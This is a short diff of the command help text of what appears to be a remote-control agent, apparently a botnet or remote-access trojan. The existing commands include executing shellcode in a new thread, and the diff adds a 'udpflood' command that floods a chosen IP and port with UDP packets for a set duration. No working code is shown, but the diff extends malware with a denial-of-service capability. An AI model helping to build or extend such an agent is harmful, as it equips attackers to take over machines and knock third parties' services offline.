@@ -32,6 +32,9 @@ Uninstalls the agent.
 execshellcode <shellcode>
 Executes shellcode in a new thread.
 
+udpflood <ip> <port> <duration>
+Floods the target with random UDP packets.
+
 exit
 Kills the agent.
 """
